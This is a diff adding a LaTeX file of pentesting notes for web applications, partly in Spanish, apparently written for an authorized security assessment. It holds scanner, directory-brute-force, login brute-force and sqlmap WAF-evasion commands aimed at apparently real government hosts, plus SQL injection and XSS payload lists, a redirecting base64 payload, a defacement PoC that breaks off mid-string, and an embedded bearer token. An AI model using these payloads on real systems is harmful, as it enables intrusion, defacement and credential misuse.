@@ -1,0 +1,1354 @@
+% Options for packages loaded elsewhere
+\PassOptionsToPackage{unicode}{hyperref}
+\PassOptionsToPackage{hyphens}{url}
+\documentclass[
+]{article}
+\usepackage{xcolor}
+\usepackage{amsmath,amssymb}
+\setcounter{secnumdepth}{-\maxdimen} % remove section numbering
+\usepackage{iftex}
+\ifPDFTeX
+  \usepackage[T1]{fontenc}
+  \usepackage[utf8]{inputenc}
+  \usepackage{textcomp} % provide euro and other symbols
+\else % if luatex or xetex
+  \usepackage{unicode-math} % this also loads fontspec
+  \defaultfontfeatures{Scale=MatchLowercase}
+  \defaultfontfeatures[\rmfamily]{Ligatures=TeX,Scale=1}
+\fi
+\usepackage{lmodern}
+\ifPDFTeX\else
+  % xetex/luatex font selection
+\fi
+% Use upquote if available, for straight quotes in verbatim environments
+\IfFileExists{upquote.sty}{\usepackage{upquote}}{}
+\IfFileExists{microtype.sty}{% use microtype if available
+  \usepackage[]{microtype}
+  \UseMicrotypeSet[protrusion]{basicmath} % disable protrusion for tt fonts
+}{}
+\makeatletter
+\@ifundefined{KOMAClassName}{% if non-KOMA class
+  \IfFileExists{parskip.sty}{%
+    \usepackage{parskip}
+  }{% else
+    \setlength{\parindent}{0pt}
+    \setlength{\parskip}{6pt plus 2pt minus 1pt}}
+}{% if KOMA class
+  \KOMAoptions{parskip=half}}
+\makeatother
+\usepackage{color}
+\usepackage{fancyvrb}
+\newcommand{\VerbBar}{|}
+\newcommand{\VERB}{\Verb[commandchars=\\\{\}]}
+\DefineVerbatimEnvironment{Highlighting}{Verbatim}{commandchars=\\\{\}}
+% Add ',fontsize=\small' for more characters per line
+\newenvironment{Shaded}{}{}
+\newcommand{\AlertTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{#1}}}
+\newcommand{\AnnotationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
+\newcommand{\AttributeTok}[1]{\textcolor[rgb]{0.49,0.56,0.16}{#1}}
+\newcommand{\BaseNTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
+\newcommand{\BuiltInTok}[1]{\textcolor[rgb]{0.00,0.50,0.00}{#1}}
+\newcommand{\CharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
+\newcommand{\CommentTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textit{#1}}}
+\newcommand{\CommentVarTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
+\newcommand{\ConstantTok}[1]{\textcolor[rgb]{0.53,0.00,0.00}{#1}}
+\newcommand{\ControlFlowTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{#1}}}
+\newcommand{\DataTypeTok}[1]{\textcolor[rgb]{0.56,0.13,0.00}{#1}}
+\newcommand{\DecValTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
+\newcommand{\DocumentationTok}[1]{\textcolor[rgb]{0.73,0.13,0.13}{\textit{#1}}}
+\newcommand{\ErrorTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{#1}}}
+\newcommand{\ExtensionTok}[1]{#1}
+\newcommand{\FloatTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{#1}}
+\newcommand{\FunctionTok}[1]{\textcolor[rgb]{0.02,0.16,0.49}{#1}}
+\newcommand{\ImportTok}[1]{\textcolor[rgb]{0.00,0.50,0.00}{\textbf{#1}}}
+\newcommand{\InformationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
+\newcommand{\KeywordTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{#1}}}
+\newcommand{\NormalTok}[1]{#1}
+\newcommand{\OperatorTok}[1]{\textcolor[rgb]{0.40,0.40,0.40}{#1}}
+\newcommand{\OtherTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{#1}}
+\newcommand{\PreprocessorTok}[1]{\textcolor[rgb]{0.74,0.48,0.00}{#1}}
+\newcommand{\RegionMarkerTok}[1]{#1}
+\newcommand{\SpecialCharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
+\newcommand{\SpecialStringTok}[1]{\textcolor[rgb]{0.73,0.40,0.53}{#1}}
+\newcommand{\StringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
+\newcommand{\VariableTok}[1]{\textcolor[rgb]{0.10,0.09,0.49}{#1}}
+\newcommand{\VerbatimStringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{#1}}
+\newcommand{\WarningTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{#1}}}}
+\usepackage{graphicx}
+\makeatletter
+\newsavebox\pandoc@box
+\newcommand*\pandocbounded[1]{% scales image to fit in text height/width
+  \sbox\pandoc@box{#1}%
+  \Gscale@div\@tempa{\textheight}{\dimexpr\ht\pandoc@box+\dp\pandoc@box\relax}%
+  \Gscale@div\@tempb{\linewidth}{\wd\pandoc@box}%
+  \ifdim\@tempb\p@<\@tempa\p@\let\@tempa\@tempb\fi% select the smaller of both
+  \ifdim\@tempa\p@<\p@\scalebox{\@tempa}{\usebox\pandoc@box}%
+  \else\usebox{\pandoc@box}%
+  \fi%
+}
+% Set default figure placement to htbp
+\def\fps@figure{htbp}
+\makeatother
+\usepackage{svg}
+\setlength{\emergencystretch}{3em} % prevent overfull lines
+\providecommand{\tightlist}{%
+  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
+\usepackage{bookmark}
+\IfFileExists{xurl.sty}{\usepackage{xurl}}{} % add URL line breaks if available
+\urlstyle{same}
+\hypersetup{
+  hidelinks,
+  pdfcreator={LaTeX via pandoc}}
+
+\author{}
+\date{}
+
+\begin{document}
+
+c:\windows\system32\cmd.exe c:\windows\system32\taskmgr.exe
+c:\windows\cmd.exe
+
+Monitored Accessibility Programs Display Switcher:
+C:\Windows\System32\DisplaySwitch.exe On-Screen Keyboard:
+C:\Windows\System32\osk.exe Magnifier: C:\Windows\System32\Magnify.exe
+Narrator: C:\Windows\System32\Narrator.exe Accessibility Shortcut keys
+(Sticky Keys): C:\Windows\System32\sethc.exe Utility Manager:
+C:\Windows\System32\utilman.ex
+
+IIS \_ use\url{https://github.com/irsdl/IIS-ShortName-Scanner}
+
+\subsubsection{Introduction}\label{introduction}
+
+Acerca de las evidencias, deben de tomarse capturas de pantalla, y
+guardar un texto que explique la imagen de evidencia.
+
+\subsection{Automated scans}\label{automated-scans}
+
+\subsubsection{Standar vulnerability scan with OWASP
+ZAP}\label{standar-vulnerability-scan-with-owasp-zap}
+
+\begin{verbatim}
+sudo apt install zaproxy
+zaproxy -cmd -addoninstallall
+\end{verbatim}
+
+Usage:
+
+In Python interpreter.
+
+\begin{verbatim}
+zaproxy -cmd -quickurl <https://miconsuladoadminqa.sre.gob.mx/ingresar> -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html
+
+zaproxy -cmd -quickurl <https://fis2022apiseg.sre.gob.mx> -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \\\\
+zaproxy -cmd -quickurl <https://fis2022seg.sre.gob.mx> -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \\\\
+zaproxy -cmd -quickurl <https://fis2022adminseg.sre.gob.mx> -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \\\\
+echo "Finished"
+
+mv /home/kali/ozap-report-* /mnt/c/Users/ohernandez/Desktop/
+\end{verbatim}
+
+Scan web application like nessus. Export HTML preferred to use then your
+custom format.
+
+\subsubsection{Standar vulnerability scan with
+Nessus}\label{standar-vulnerability-scan-with-nessus}
+
+\begin{verbatim}
+sudo apt update && sudo apt upgrade
+curl -JLO '<https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.3.0-debian9_amd64.deb>'
+sudo dpkg -i Nessus*
+
+sudo /opt/nessus/sbin/nessus-service
+\end{verbatim}
+
+Go to\url{https://localhost:8834}
+
+Scan target mist virutal host
+
+\href{http://miconsuladoapiqa.sre.gob.mx/}{miconsuladoapiqa.sre.gob.mx}{[}172.18.217.6{]},
+\href{http://miconsuladoqa.sre.gob.mx/}{miconsuladoqa.sre.gob.mx}{[}172.18.217.6{]},
+\href{http://miconsuladoadminqa.sre.gob.mx/}{miconsuladoadminqa.sre.gob.mx}{[}172.18.217.6{]}
+
+\subsubsection{Standar vulnerability scan with
+Lighthouse}\label{standar-vulnerability-scan-with-lighthouse}
+
+\begin{verbatim}
+lighthouse <url>
+lighthouse --chrome-flags="--headless" <url>
+\end{verbatim}
+
+\subsubsection{Specific technology:
+Joomla}\label{specific-technology-joomla}
+
+Analysis with joomscan.
+
+\begin{verbatim}
+git clone <https://github.com/rezasp/joomscan.git>
+cd joomscan
+perl joomscan.pl
+\end{verbatim}
+
+\subsubsection{Specific technology:
+WordPress}\label{specific-technology-wordpress}
+
+\subsection{Fingerprint}\label{fingerprint}
+
+\paragraph{Web application
+exploration}\label{web-application-exploration}
+
+Navigation.
+
+Identify user flows.
+
+\paragraph{Ports identification}\label{ports-identification}
+
+Use NMAP.
+
+\paragraph{Wireshark analysis
+exploration}\label{wireshark-analysis-exploration}
+
+\begin{verbatim}
+ip.addr == 172.25.118.65
+tcp.dstport == 443
+tcp.port==443 && ip.addr == 172.25.118.65
+\end{verbatim}
+
+\paragraph{Hosted and related applications
+identification}\label{hosted-and-related-applications-identification}
+
+Virtual hosts maybe.
+
+\begin{verbatim}
+nmap -sV --script=http-enum <target>
+\end{verbatim}
+
+\paragraph{User roles identification}\label{user-roles-identification}
+
+Identify user roles in application names, ids.
+
+\paragraph{Web application technologies
+recognition}\label{web-application-technologies-recognition}
+
+Use Walapalizer chrome extension.
+
+\textbackslash href\{\url{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}\}\{Enlace
+de la extensión
+
+\paragraph{Search for known vulnerabilities of recognized
+technologies}\label{search-for-known-vulnerabilities-of-recognized-technologies}
+
+\url{https://security.snyk.io/}\url{https://www.exploit-db.com/}\url{https://www.cvedetails.com/}\url{https://nvd.nist.gov/}
+
+Use developer tools:
+
+Ms edge \textgreater{} Lighthouse \textgreater{} Generate report with
+snink analysis
+
+\paragraph{Extraction of metadata from downloadable files
+test}\label{extraction-of-metadata-from-downloadable-files-test}
+
+\begin{verbatim}
+exiftool sectorprivado.pdf | grep 'Creator\\\\|Producer\\\\|Windows|\\\\Linux|\\\\OS|\\\\C:|\\\\http'>
+\end{verbatim}
+
+\paragraph{Extraction of embedded files
+test}\label{extraction-of-embedded-files-test}
+
+\begin{verbatim}
+pip install docscraper
+sudo apt install exiftool
+
+import docscraper
+allowed_domains = ["vulnerable-site.com "]
+start_urls = ["<https://vulnerable-site.com> /index.php/rmpe"]
+extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
+docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
+\end{verbatim}
+
+\begin{verbatim}
+wget <https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py>
+python3 link_extractor.py <https://github.com> -m 2
+curl <https://vulnerable-site.com> /index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\\\\n' | grep -Eo '(http|https|www):(.*)'
+\end{verbatim}
+
+Descargar con el nombre propuesto por el servidor en lugar de wget:
+
+\begin{verbatim}
+curl -JLO https:\\\\/\\\\/vulnerable-site.com \\\\/index.php\\\\/rmpe\\\\/article\\\\/download\\\\/62\\\\/58\\\\/100
+\end{verbatim}
+
+Search for usernames:
+
+\begin{verbatim}
+exiftool sectorprivado.pdf | grep 'Creator\\\\|Producer\\\\|Windows|\\\\Linux|\\\\OS|\\\\C:|\\\\http'
+\end{verbatim}
+
+\paragraph{Data extraction from Javascript Source Code
+Test}\label{data-extraction-from-javascript-source-code-test}
+
+Installation of tools:
+
+\begin{verbatim}
+pip install jsbeautifier
+js-beautify file.js
+\end{verbatim}
+
+Encription keys search:
+
+\begin{verbatim}
+curl -s <https://vulnerable-site.com/js/app.dca99adc.js> | js-beautify | awk '{$1=$1;print}' | grep -iE  "crypt|aes|hmac|md5|sha512|sha256|sha1"
+
+echo -n 'hsBI69O90juKhpPx' | md5sum
+echo -n 'ZMQfCfRnhWZoamQDBWYrZyNqb5Tpr3' | md5sum
+\end{verbatim}
+
+sudo apt install npm
+
+node criptojs.js -def data.txt -key “190fdff54d48da67dff47a8f5a84b402”
+
+In case the code is obsfuscated:
+
+\begin{itemize}
+\tightlist
+\item
+  JavaScript Deobfuscator
+  (\href{http://deobfuscate.io/}{deobfuscate.io})
+\item
+  de4js \textbar{} JavaScript Deobfuscator and Unpacker
+  (\href{http://lelinhtinh.github.io/}{lelinhtinh.github.io})
+\end{itemize}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  \url{https://deobfuscate.relative.im/}
+\item
+  \url{https://deobfuscate.io/}
+\item
+  \url{https://lelinhtinh.github.io/de4js/}
+\end{enumerate}
+
+\begin{verbatim}
+curl <https://gist.github.com/relative/79e392bced4b9bed8fd076f834e06dee/raw/obfuscated.js> -o ./obfuscated.js
+
+sudo npm install -g js-deobfuscator
+synchrony deobfuscate  obfuscated2.js
+\end{verbatim}
+
+npm install deobfuscator npm install de4js
+
+\url{https://www.npmjs.com/package/de4js/v/1.10.4}
+
+Encrypt and Decrypt with Key in Online \textbar{} Online Encryption and
+Decryption (\href{http://bitcompiler.com/}{bitcompiler.com}) JSON Web
+Tokens - \href{http://jwt.io/}{jwt.io}
+
+Si esta en cifrado en la URL entonces URL Parameters o algo asi usar
+primero un URL Decoder URI.
+
+Go to the folder with the program:
+
+\begin{verbatim}
+cd bin/de4js
+\end{verbatim}
+
+Start the server:
+
+\begin{verbatim}
+npm start
+\end{verbatim}
+
+\subsection{Access Control}\label{access-control}
+
+\paragraph{Application stored cache on the client
+verification}\label{application-stored-cache-on-the-client-verification}
+
+Go to page panel, administration or whatever you want, close session and
+return.
+
+\paragraph{Folders discover test}\label{folders-discover-test}
+
+\begin{verbatim}
+sudo apt install dirb
+\end{verbatim}
+
+Usage:
+
+\begin{verbatim}
+dirb "<https://cumbreap2022seg.sre.gob.mx>" /usr/share/wordlists/dirb/common.txt
+\end{verbatim}
+
+\begin{verbatim}
+sudo apt install wordlists
+ls -lh /usr/share/wordlists/
+
+sudo apt install dirb
+
+sudo apt install dirbuster
+sudo apt install gobuster
+
+dirb "<https://cumbreap2022seg.sre.gob.mx>" /usr/share/wordlists/dirb/common.txt
+\end{verbatim}
+
+\subsection{Authentication and Access
+Control}\label{authentication-and-access-control}
+
+\paragraph{Login brute force test}\label{login-brute-force-test}
+
+GitHub - FlorianBord2/Hatch-python3-optimised: Hatch is a brute force
+tool that is used to brute force most websites
+
+\begin{verbatim}
+git clone <https://github.com/FlorianBord2/Hatch-python3-optimised>
+\end{verbatim}
+
+\begin{verbatim}
+python main.py --website "<https://vulnerable-site.com> /login" --passlist  passlist.txt  --username "cibersoc_3tin"  --usernamesel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(1) > div > div > input" --passsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(2) > div > div > input" --loginsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(2) > div > div > div > button > span"
+\end{verbatim}
+
+\paragraph{Usernames enumeration}\label{usernames-enumeration}
+
+Test more than 10 usernames.
+
+\paragraph{WebSocket Cross-site hijacking
+Test}\label{websocket-cross-site-hijacking-test}
+
+\textbackslash nonumsidenote\{Usually a web aplication could work with
+HTTP 1.0, HTTP 2.0, WebSockets and WebHooks. Since a cross-site
+WebSocket hijacking attack is essentially a CSRF vulnerability on a
+WebSocket handshake, the first step to performing an attack is to review
+the WebSocket handshakes that the application carries out and determine
+whether they are protected against CSRF.
+
+In terms of the normal conditions for CSRF attacks, you typically need
+to find a handshake message that relies solely on HTTP cookies for
+session handling and doesn’t employ any tokens or other unpredictable
+values in request parameters. For example, the following WebSocket
+handshake request is probably vulnerable to CSRF, because the only
+session token is transmitted in a cookie
+
+\begin{verbatim}
+GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket
+\end{verbatim}
+
+\textbackslash begin\{fullwidth\} \% Use the whole page width The
+Sec-WebSocket-Key header contains a random value to prevent errors from
+caching proxies, and is not used for authentication or session handling
+purposes. If the WebSocket handshake request is vulnerable to CSRF, then
+an attacker’s web page can perform a cross-site request to open a
+WebSocket on the vulnerable site. What happens next in the attack
+depends entirely on the application’s logic and how it is using
+WebSockets. The attack might involve: \textbackslash end\{fullwidth
+
+\subsection{Use of HTTPS and TLS, Data
+encryption}\label{use-of-https-and-tls-data-encryption}
+
+\paragraph{HTTP Redirection test}\label{http-redirection-test}
+
+\begin{verbatim}
+curl -ILs "<http://$1>" | grep -Pi "^HTTP+|Location|X-CDN|Connection"
+\end{verbatim}
+
+\paragraph{TLS/SSL Verification Test}\label{tlsssl-verification-test}
+
+\begin{verbatim}
+sudo apt install tlssled
+tlssled vulnerable-site.com 443
+\end{verbatim}
+
+SSLSCAN
+
+\begin{verbatim}
+sudo apt install sslscan
+sslscan <https://vulnerable-site.com>
+\end{verbatim}
+
+\paragraph{HTTP Security Headers
+Verification}\label{http-security-headers-verification}
+
+SHCHEK
+
+\begin{verbatim}
+pip3 install shcheck
+shcheck.py <https://insecurity.blog>
+\end{verbatim}
+
+\paragraph{HTTP Host Header Injection
+Test}\label{http-host-header-injection-test}
+
+CURL
+
+\begin{verbatim}
+curl -s -D - --header 'Host: theevilsite.com' <https://vulnerable-site.com> > output && cat output | grep --color -E '^|theevilsite.com'
+\end{verbatim}
+
+\paragraph{HTTP Options Method
+Verification}\label{http-options-method-verification}
+
+Add nmap to Kali Linux Subsystem
+
+\begin{verbatim}
+alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
+\end{verbatim}
+
+NMAP
+
+\begin{verbatim}
+nmap --script http-methods <target>
+\end{verbatim}
+
+In specific path
+
+\begin{verbatim}
+curl -i -X OPTIONS <http://example.org/path>
+\end{verbatim}
+
+\paragraph{HTTP Trace Method Check}\label{http-trace-method-check}
+
+\begin{verbatim}
+curl --insecure -v -X TRACE <https://www.google.com/>
+\end{verbatim}
+
+La respuesta esperada para que no este activo es: 405 Method Not Allowed
+
+\paragraph{HTTP Cookies Verification}\label{http-cookies-verification}
+
+CURL
+
+\begin{verbatim}
+curl '<https://vulnerable-site.com>' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
+curl -X GET -L '<https://intgra.sre.gob.mx/ingresar/>' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
+\end{verbatim}
+
+\paragraph{Subresource Integrity (SRI) Implementation
+Verification}\label{subresource-integrity-sri-implementation-verification}
+
+CURL
+
+\begin{verbatim}
+sudo apt install tidy
+curl -s <https://laysent.github.io/subresource-integrity-demo/integrity.html> | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
+\end{verbatim}
+
+\paragraph{WebSocket Unencrypted Communications
+Verification}\label{websocket-unencrypted-communications-verification}
+
+Search for headers: Sec-WebSocket-
+
+\subsection{Input validation}\label{input-validation}
+
+\subsubsection{SQL injection tests with
+SQLMAP}\label{sql-injection-tests-with-sqlmap}
+
+\begin{verbatim}
+sudo apt-get install sqlmap
+
+sqlmap -u <http://testphp.vulnweb.com/listproducts.php?cat=1> -D acuart --tables
+
+sqlmap -u <http://testphp.vulnweb.com/listproducts.php?cat=1> --dbs   --headers= "Authorization: Bearer: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiOTZhMTJlZjcxNGUzZmUwMTdlOWZiMzZkOTZiMTBkZjVjNDIwYTQ3OWU5N2IwYjRmNGNhNDE3MTM5MzZlNzNjOWUwODk0ZDFjZTFlMjVmMTQiLCJpYXQiOjE2NjEyNzY5MjAuMDY5MDgxLCJuYmYiOjE2NjEyNzY5MjAuMDY5MDgzLCJleHAiOjE2OTI4MTI5MjAuMDY1MjQsInN1YiI6IjE3Iiwic2NvcGVzIjpbXX0.gJmnuUp03Y0ZL_3enF3frFLWppUfN5GIEk-xGbB4YZFulWXBeYglBxMu6vCpCZ-hGP0HqeeGYGUKUgUTJmI3eyhyln-NpDh2vqc50Dy7BEwMPGRl4BEHVGJrlQ2O6G_AOvCFP977SJS4vcUrn4ZtO9jigywy0-OTm8_z-M9gC-vfP-WYZ6hx-_QdFOzTZBYpbtgMxIaUh38ysnhsSsUSH-eD7kUJQmC822Xc9qkxwhkK3VNVfMUJByM3xi2gVtmCvtOFXzMejwkdiiut6bZtLNNxZT9KIxjL7OzD87jkIiyWnNFO5c_krp4GEQM1cYmTgfS10M-IR2hnhBHAXXj46lPpGkjNkqindspxDliVRpV78PVeZlkkM0q3Np9Q_-92pSlQkEVR-0xlAf5z2OhuGfYd0FuhVlDFYu5BNwer71QJX9H0vCTYnseA_LFd4GxKm9YiLey8SBXid84dJ0fiH5JF1rq64oiIOVmTnO198mEYhGIYy5UQH-HogKIGGUL2Hi0TOzW24PJnZBrMe_YY1HLsk6BPg-xfaBqbDXxMJxdJ1-vFeU200Gtxfo9crJ11wKwvWy90Q230hUXWCKNaRKeLNcKv9RWQq2_uCUjNAzcuGZsq69AwfYQLc4MvOcW5QZBt_UVARyGVSBytLOJykNWjIUqjCuXp7PpQ6BpmgEc" --method=POST --proxy="<http://127.0.0.1:8080>"
+
+sqlmap -r request.txt  --proxy="<http://172.24.176.1:8080>" --random-agent --level 2 --risk 2 --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --time-sec 15
+
+sqlmap -r request.txt  --proxy="<http://172.24.176.1:8080>"
+\end{verbatim}
+
+\subsection{Manual SQL injection
+tests}\label{manual-sql-injection-tests}
+
+\begin{verbatim}
+select * from users where username='admin' or '1'='1';# and password='1234' LIMIT 1;
+\end{verbatim}
+
+\paragraph{\texorpdfstring{S\textbf{tep 2: Basic
+Injection}}{Step 2: Basic Injection}}\label{step-2-basic-injection}
+
+On the User ID field, enter “1” and click Submit. That is supposed to
+print the ID, First\_name, and Surname on the screen as you can see
+below.
+
+The SQL syntax being exploited here is:
+
+\begin{verbatim}
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+\end{verbatim}
+
+\paragraph{\texorpdfstring{\textbf{Step 3: Always True
+Scenario}}{Step 3: Always True Scenario}}\label{step-3-always-true-scenario}
+
+An advanced method to extract all the \texttt{First\_names} and Surnames
+from the database would be to use the input:
+\texttt{\%\textquotesingle{}\ or\ \textquotesingle{}1\textquotesingle{}=\textquotesingle{}1\textquotesingle{}}
+
+\paragraph{Cross Site Scripting Validation
+Test}\label{cross-site-scripting-validation-test}
+
+\begin{verbatim}
+<script>javascript:alert('XSS HACKED')</script>
+\end{verbatim}
+
+\begin{verbatim}
+<a href="javascript:alert(123456789)">asdf</a>
+\end{verbatim}
+
+\begin{verbatim}
+<a href="" onclick="alert('I excuted JavaScript!');">
+\end{verbatim}
+
+\begin{verbatim}
+' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
+\end{verbatim}
+
+\paragraph{}\label{section}
+
+\paragraph{Code injection characters and strings
+test}\label{code-injection-characters-and-strings-test}
+
+\begin{verbatim}
+' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
+\end{verbatim}
+
+\paragraph{Multiple payloads test}\label{multiple-payloads-test}
+
+\begin{verbatim}
+<a href='www.evil-site.com'>www.evil-site.com link</a>
+<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg=='>www.evil-site.com link</a>
+
+<a href="javascript:document.write('<image src =q onerror=prompt(8)>')">evil link</a>
+<a href="javascript:let pdfWindow = window.open('');pdfWindow.document.write( `<iframe width='100%' height='100%' src='data:text/html;base64, ` + encodeURI(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`) + `'></iframe>` )
+">evil link</a>
+<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4='>clic on xss</a>
+<script>javascript:alert(123456789)</script>
+<image src =q onerror=prompt(8)>
+<img src="javascript:alert('XSS');">
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe><textarea></iframe><img src='' onerror='alert(document.domain)'>
+</textarea><script>alert(/xss/)</script>
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);" onerror="javascript:alert(1)"  onclick="javascript:alert(1)">
+<iframe><textarea></iframe><img src="" onerror="alert('14/04/2022')">
+
+<image src =q onerror=`window.parent.location = 'http://127.0.0.1:8000/index.html'`>
+<image src =q onerror='javascript:alert(1223456789)'>
+\end{verbatim}
+
+Example: Base64 XSS payload
+
+\begin{verbatim}
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg==
+\end{verbatim}
+
+Insert value in HTML element with javascript:
+
+\begin{verbatim}
+document.getElementById("f_464cf370-896e-4af1-a0b1-3f4621ff0a36").value = '<script>javascript:alert(123456789)</script>';
+\end{verbatim}
+
+\paragraph{Cross Site Scripting Test}\label{cross-site-scripting-test}
+
+IMPORTANTE, para continuar por favor use clic derecho en este vínculo y
+abralo en una nueva ventana.
+
+\begin{verbatim}
+data:text/html,<script>alert('XSS example');</script>
+\end{verbatim}
+
+\begin{verbatim}
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg==
+\end{verbatim}
+
+\begin{verbatim}
+data:text/html;base64,PHNjcmlwdD5jb25maXJtKCJQcm9udG8gc2VyYXMgcmVkaXJlY2Npb25hZG8gcG9yIGNpYmVyc29jXzN0aW4gIik7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vb3N2YWxkb2hkem0uZ2l0aHViLmlvL3NpdGlvLW1hbG8vIik7PC9zY3JpcHQ+Cg==
+\end{verbatim}
+
+\paragraph{Defacement Test PoC}\label{defacement-test-poc}
+
+\begin{verbatim}
+var b64code = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPHRpdGxlPkhhY2tlZCBCeSBDaWJlclNPQyBIYWNrZXJzPC90aXRsZT4KICA8dGl0bGU+Q2liZXJTT0MgSGFja2VyczwvdGl0bGU+CjxsaW5rIHJlbD0iU0hPUlRDVVQgSUNPTiIgaHJlZj0iaHR0cHM6Ly9pNjgudGlueXBpYy5jb20vNjVzaTl4LmpwZyIgdHlwZT0iaW1hZ2UveC1pY29uIi8+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Ob3NpZmVyJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUljZWxhbmQnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9U2FycGFuY2g6NzAwIiByZWw9InN0eWxlc2hlZXQiPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9cGxheSIgcmVsPSJzdHlsZXNoZWV0Ij4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iaHR0cHM6Ly9jc3NoYWtlLnN1cmdlLnNoL2Nzc2hha2UubWluLmNzcyI+CiAgCiAgCiAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+Cgo8c3R5bGU+CiogewogICAgbWFyZ2luOiAwOwogICAgcGFkZGluZzogMDsKfQoKYm9keXsKICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDA7Cn0KCmhlYWRlciB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMzMsIDMzLCAzMywgMC45KTsKICAgIGNvbG9yOiNmZmZmZmY7CiAgICBkaXNwbGF5OmJsb2NrOwogICAgZm9udDogMTRweC8xLjMgQXJpYWwsc2